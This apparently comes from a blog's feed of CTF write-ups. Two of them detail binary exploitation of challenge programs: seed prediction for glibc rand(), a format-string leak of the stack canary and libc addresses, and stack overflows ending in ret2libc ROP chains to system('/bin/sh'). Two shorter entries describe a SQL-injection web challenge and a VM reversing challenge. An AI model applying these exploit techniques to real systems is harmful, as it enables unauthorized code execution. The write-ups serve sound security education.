[{"content":"Introduction This challenge was solved while participating to an annual cyber security event done in Grenoble ‚õ∞Ô∏è in France üá´üá∑.\nThe password input of this challenge is vulnerable to a stack-based buffer overflow, which allows code execution.\nThe difficulty is not the overflow itself, but reliably winning the game, since the bot‚Äôs moves are generated using rand().\nWe are given:\ngame_patched libc.so.6 ld-linux-x86-64.so.2 You can download those files here.\nGame Logic Each round, the bot chooses its move with:\nbot_move = rand() % 3; If we win 31 rounds, the program prints:\nPassword :\nThe winning move is simply:\n(my_move = (bot_move + 1) % 3)\nSo if we can predict rand(), we win every round. Predicting the Bot (PRNG Abuse) Leaking the Seed\nThe menu has an option that prints logs. Inside those logs, a value called token is printed:\ntoken: \u0026lt;number\u0026gt; This value is used to seed the PRNG.\nBy selecting the log option and parsing the output, we can recover the exact seed. Reproducing rand() Locally\nThe binary uses glibc‚Äôs rand(). We can reproduce the exact same random sequence locally using ctypes:\nlibc2 = ctypes.CDLL(\u0026#34;libc.so.6\u0026#34;) libc2.srand(seed) libc2.rand() # sync After that, every call to libc2.rand() matches the bot‚Äôs moves. Auto-Winning the Game\nfor i in range(31): bot_move = libc2.rand() % 3 my_move = (bot_move + 1) % 3 send(my_move) This reliably brings us to the password prompt.\nBuffer Overflow The password is read into a fixed-size stack buffer without bounds checking.\nBy sending 200+ bytes, we overwrite the saved return address and gain control of execution.\nHowever, ASLR is enabled, so we need a libc leak first.\nStage 1 ‚Äì Leaking libc We build a small ROP chain to call puts on its own GOT entry:\nputs(puts@GOT) return to main\nThis leaks the runtime address of puts.\nFrom that, we compute the libc base:\nlibc_base = leaked_puts - libc.symbols[\u0026ldquo;puts\u0026rdquo;]\nStage 2 ‚Äì Getting Back to the Password After leaking libc, the program returns to the menu. The PRNG seed changes, so we simply:\nRead logs again Extract the new seed Re-sync rand() Win the game again Now we reach the password prompt with libc fully resolved.\nStage 3 ‚Äì ret2libc With the libc base known, we prepare the final payload:\n[pop rdi] [/bin/sh] [system]\nA single ret gadget is added before pop rdi to keep the stack 16-byte aligned.\nThis results in:\nsystem(\u0026#34;/bin/sh\u0026#34;); Result We get a shell and can read the flag:\n$ cat flag flag{...} You can look at the solve.py.\n","date":"2025-11-29T00:00:00Z","image":"http://localhost:1313/images/grehack2025.png","permalink":"http://localhost:1313/writeups/grehack2025/chifoumi/","title":"Chifoumi - Grehack 2025"},{"content":"Introduction This challenge is a pseudo AI assistant.\n$ nc SMOLLM.flu.xxx 1024 Hello, and welcome to sm√∏llm. Your friendly AI assistant. You can add you own custom tokens or run a prompt. Do you want to 1) Add a custom token 2) Run a prompt \u0026gt; The source code is provided, you can find it here.\nAnd here is the sec that seemed to be present on the binary.\n$ checksec smollm [*] \u0026#39;/home/dajaaj/personal/hacklu2025/smollm/smollm\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b\u0026#39;.\u0026#39; SHSTK: Enabled IBT: Enabled Stripped: No Adding a token (8 bytes) will put it at the end of a pre-defined list of words.\nDo you want to 1) Add a custom token 2) Run a prompt \u0026gt;1 token?\u0026gt;tonio void add_token(const char* token, int len) { if (n_tokens == 256) { printf(\u0026#34;Max number of tokens reached!\\n\u0026#34;); return; } memcpy(tokens[n_tokens], token, len); memset(tokens[n_tokens++] + len, \u0026#39; \u0026#39;, TOKEN_SIZE - len); } Whereas running the prompt will ask for some input and print random words based on that.\nDo you want to 1) Add a custom token 2) Run a prompt \u0026gt;2 How can I help you? \u0026gt;Hi? tell tonio plfanzencould Vulnerabilities We can se two main vulnerabilities in the code which are both in the run_prompt function.\nThis function simulate the AI assistant.\nvoid run_prompt() { int n; static unsigned int combinator = 0; char in_buf[256], out_buf[256]; bzero(in_buf, sizeof(in_buf)); bzero(out_buf, sizeof(in_buf)); printf(\u0026#34;How can I help you?\\n\u0026gt;\u0026#34;); n = read(STDIN_FILENO, in_buf, sizeof(in_buf)); if (n \u0026lt;= 0) { printf(\u0026#34;Read error\\n\u0026#34;); exit(-1); } for (int i = 0; i \u0026lt; n; i++) { memcpy(\u0026amp;out_buf[i*TOKEN_SIZE], tokens[(in_buf[i] + combinator++) % n_tokens], TOKEN_SIZE); } printf(out_buf); printf(\u0026#34;\\n\u0026#34;); } Format String At the end of the function we can see that the out_buf will be printed as a format string, so we can use it to leak the stack.\nStack based buffer overflow The memcpy will write after the out_buf after i=32, cause its size is 256. 32*TOKEN_SIZE = 32*8 = 256.\nWith this finds we can read and control the stack !\nExploitation As ASLR is enabled we\u0026rsquo;ll need to first leak some addresses on the stack to then construct a ROP chain (NX is enabled).\nBut first we need to understand the words selection logic.\nLogic Above is the code that choose the 8 bytes word to write to out_buf baised on our input.\nmemcpy(\u0026amp;out_buf[i*TOKEN_SIZE], tokens[(in_buf[i] + combinator++) % n_tokens], TOKEN_SIZE); So if we want the token we added to be printed we need to use the following formula: token_index - i - combinator.\nStack leak To leak the stack we can add the following token: %p%p%p%p, and print it.\nDo you want to 1) Add a custom token 2) Run a prompt \u0026gt;1 token?\u0026gt;%p%p%p%p Do you want to 1) Add a custom token 2) Run a prompt \u0026gt;Invalid choice Do you want to 1) Add a custom token 2) Run a prompt \u0026gt;2 How can I help you? \u0026gt;j 0x10x20x10x5711695493c0can Here we leak !\nWe can see an \u0026ldquo;invalide choice\u0026rdquo; message, as add_token only reads 8 bytes, the \\n will be red after.\nNow let\u0026rsquo;s try to print our token 32 time:\nDo you want to 1) Add a custom token 2) Run a prompt \u0026gt;2 How can I help you? \u0026gt;jihgfedcba`_^]\\[ZYXWVUTSRQPONMLK 0x200x210x200x6248b7acb3c00x636465666768696a0x5b5c5d5e5f6061620x535455565758595a0x4b4c4d4e4f5051520xa(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020776f6e6b0x141d53f320319c000x7fff3701ce6f0x6248b7ac8474(nil)0x32000000000000000x7025702570250a0x141d53f320319c00(nil)0x7fff3701cfc80x7fff3701cf400x1(nil)0x7a862a7211ca0x7fff3701cef00x7fff3701cfc80x1b7ac60400x6248b7ac83890x7fff3701cfc80xe36d61cfae476dae0x1(nil)0x6248b7acad900x7a862a9430000xe36d61cfada76dae0xe99f5b2813c56dae0x7fff00000000(nil)(nil)0x10x7fff3701cfc00x141d53f320319c000x7fff3701cfa00x7a862a72128b0x7fff3701cfd80x6248b7acad900x7fff3701cfd80x6248b7ac8389(nil)(nil)0x6248b7ac80400x7fff3701cfc0(nil)(nil)(nil)0x6248b7ac80650x7fff3701cfb80x380x10x7fff3701dfc8(nil)0x7fff3701dfd9(nil)0x210x7fff371530000x330xd300x100x178bfbff0x6know Here because of the \\n, we already write out of the buffer.\nAll the 0x7025702570257025 are our %p.\nStack overwrite If we try to print 33 time our token:\n*** stack smashing detected ***: terminated We hit the canary\u0026hellip; But we leaked it earlier ! So we just have to do a first leak from a first run_prompt and then overwrite the canay with the value we got from the leak.\nThe stack like that:\n[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address][ ??? ]\nROP As we control the return address, we might be able to do a ROP ! But with PIE and ASLR on it seems complicated :/\nFortunatly an address of the libc is present in the stack\u0026rsquo;s leak (0x7a862a7211ca in the leak above).\n[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address ][ ??? ][ ... ][ libc address ]\nAnd system and /bin/sh are present in the provided libc :)\nSo we can create a shell !\nWe will overwrite the stack to get something like that:\n[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ system ]\nThere is a last problem which I figure out but looking at /tmp/core.smollm.\u0026lt;pid\u0026gt; file, when a program crashes it creates this file which you can analyse in gdb. And I saw the following error.\n0x7f753b65843b movaps xmmword ptr [rsp + 0x50], xmm0 \u0026lt;[0x7ffd8e1025e8] not aligned to 16 bytes\u0026gt; After looking at some blog post I figure out that adding a ret gadget would do the job.\n[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ ret ][ system ]\nTada !!\n$ cat flag flag{w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c} Feel free to read my script, even if its a bit messy Xd.\n","date":"2025-10-24T00:00:00Z","permalink":"http://localhost:1313/writeups/hack.lu-2025/smollm/","title":"Smollm - Hack.lu 2025"},{"content":"Introduction I created this challenge for a school CTF project üìö. The goal is to exploit multiple vulnerabilities chained together to extract secrets from the database.\nMain Techniques Privilege Escalation via Cookies: a client-side cookie controls access to admin-only features. Logic Flaw Abuse: user verification can be triggered without proper authorization. Second-Order Blind SQL Injection: malicious input is stored first, then executed later in a different context. Automated Exploitation: the injection can be exploited using tools like sqlmap. Your turn To try this challenge, download the given files and run the application locally.\nGo in the directory source, and run docker compose up, once done the website will be available at http://localhost:5000/.\nIf you get stuck, a full writeup is available in solution/Solution.md. PS: It‚Äôs written in French ü§ì\n","date":"2025-06-30T00:00:00Z","permalink":"http://localhost:1313/challenges/shutlock2026/strangequery/","title":"StrangeQuery - Shutlock 2025"},{"content":"Introduction I did this challenge for a school CTF project üìö. The goal of this challenge is to understand the VM and recover the flag.\nMain Technique Decompression: the real logic is hidden using bzip2 compression. Deobfuscation: variable names and structure are intentionally scrambled. VM Reverse Engineering: the script implements its own instruction set, registers, and execution loop. Bytecode Analysis: reconstruct the instructions and translate them into readable pseudo-code. Your turn To try this challenge download the given files, and start the challenge with the file source/V√©ritableMyst√®re.py.\nIf at any point you are stuck, feel free to look at the writeup at solution/Solution.md. PS: It\u0026rsquo;s written in French ü§ì\n","date":"2025-06-30T00:00:00Z","permalink":"http://localhost:1313/challenges/shutlock2026/v%C3%A9ritablemyst%C3%A8re/","title":"V√©ritableMyst√®re - Shutlock 2025"}]